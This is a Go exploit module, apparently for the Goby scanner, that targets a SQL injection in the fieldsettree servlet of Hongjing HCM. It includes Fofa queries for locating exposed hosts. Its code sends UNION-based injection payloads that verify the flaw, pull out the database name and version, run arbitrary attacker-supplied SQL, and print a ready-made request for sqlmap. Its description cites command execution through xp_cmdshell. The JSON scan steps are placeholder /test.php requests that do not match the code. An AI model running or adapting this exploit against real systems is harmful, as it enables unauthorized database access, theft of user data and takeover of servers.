package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Macro HCM /templates/attestation/.. /.. /servlet/fieldsettree SQL Injection Vulnerability",
    "Description": "<p>An unauthenticated remote attacker can execute arbitrary commands to control the server by exploiting the SQL injection vulnerability to cooperate with the database xp_cmdshell. After analysis and judgment, it is recommended that the vulnerability be fixed as soon as possible.An attacker can exploit this vulnerability to execute arbitrary SQL statements, such as querying data, downloading data, writing to a webshell, executing system commands, and bypassing login restrictions.</p>",
    "Product": "Hongjing HCM",
    "Homepage": "http://www.hjsoft.com.cn/#/",
    "DisclosureDate": "2024-10-29",
    "PostTime": "2024-11-13",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"人力资源信息管理系统\" && body=\"用户名\"",
    "GobyQuery": "title=\"人力资源信息管理系统\" && body=\"用户名\"",
    "Level": "1",
    "Impact": "<p>Attackers can read sensitive information in databases, such as user passwords and bank accounts, resulting in user privacy leakage.</p>",
    "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p> 2. The manufacturer has released the latest fix version, please follow the official website <a href=\"http://www.hjsoft.com.cn/#/\">http://www.hjsoft.com.cn/#/</a></p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/142334251"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "db_name,version,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT 18,DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "宏景HCM /templates/attestation/.. /.. /servlet/fieldsettree SQL 注入漏洞",
            "Product": "宏景HCM",
            "Description": "<p>宏景eHR fieldsettree&nbsp;接口处存在SQL注入漏洞，,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。</p><p>Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。<br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。<br></p><p>2、该厂商已发布最新修复版本，关注官网&nbsp;<a href=\"http://www.hjsoft.com.cn/#/\">http://www.hjsoft.com.cn/#/</a></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Macro HCM /templates/attestation/.. /.. /servlet/fieldsettree SQL Injection Vulnerability",
            "Product": "Hongjing HCM",
            "Description": "<p>An unauthenticated remote attacker can execute arbitrary commands to control the server by exploiting the SQL injection vulnerability to cooperate with the database xp_cmdshell. After analysis and judgment, it is recommended that the vulnerability be fixed as soon as possible.An attacker can exploit this vulnerability to execute arbitrary SQL statements, such as querying data, downloading data, writing to a webshell, executing system commands, and bypassing login restrictions.<br></p>",
            "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>&nbsp;2. The manufacturer has released the latest fix version, please follow the official website <a href=\"http://www.hjsoft.com.cn/#/\">http://www.hjsoft.com.cn/#/</a><br></p>",
            "Impact": "<p>Attackers can read sensitive information in databases, such as user passwords and bank accounts, resulting in user privacy leakage.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(url)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = "flag=2&infor=1' UNION ALL " + sql + ",18-- ltAi"
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
			"Accept-Language":           "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Accept-Encoding":           "gzip, deflate, br,",
			"Upgrade-Insecure-Requests": "1",
			"Sec-Fetch-Dest":            "document",
			"Sec-Fetch-Mode":            "navigate",
			"Sec-Fetch-Site":            "none",
			"Sec-Fetch-User":            "?1",
			"Priority":                  "u=0 i",
			"Te":                        "trailers",
			"Content-Type":              "application/x-www-form-urlencoded",
		}

		//rawPayload := fmt.Sprintf("1 union select 1,1,1,1,1,1,(SELECT (%s)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from sessions where userid='1'#&dstfrm=1", sql)
		urlget := "/templates/attestation/../../servlet/fieldsettree"
		resp, err = setPostRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/templates/attestation/../../servlet/fieldsettree"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			checkValue := goutils.RandomHexString(6)
			hash := md5.New()
			hash.Write([]byte(checkValue))
			content := hex.EncodeToString(hash.Sum(nil))
			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中

			sql := "SELECT 18,LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '" + checkValue + "'), 2))"

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"
			defaultModeMap := map[string]string{
				"db_name": "SELECT 18,DB_NAME()",
				"version": "SELECT 18,@@version",
			}
			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /templates/attestation/../../servlet/fieldsettree HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n" +
				"Upgrade-Insecure-Requests: 1\n" +
				"Sec-Fetch-Dest: document\n" +
				"Sec-Fetch-Mode: navigate\n" +
				"Sec-Fetch-Site: none\n" +
				"Sec-Fetch-User: ?1\n" +
				"Priority: u=0, i\n" +
				"Te: trailers\n" +
				"Content-Type: application/x-www-form-urlencoded\n\n" +
				"flag=2&infor=1' UNION ALL SELECT 18,LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '123456'), 2)),18-- ltAi"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `<TreeNode[^>]*title="([^"]+)"[^>]*>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
				return getname[1][1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "db_name" {
				sql := defaultModeMap["db_name"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "version" {
				sql := defaultModeMap["version"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
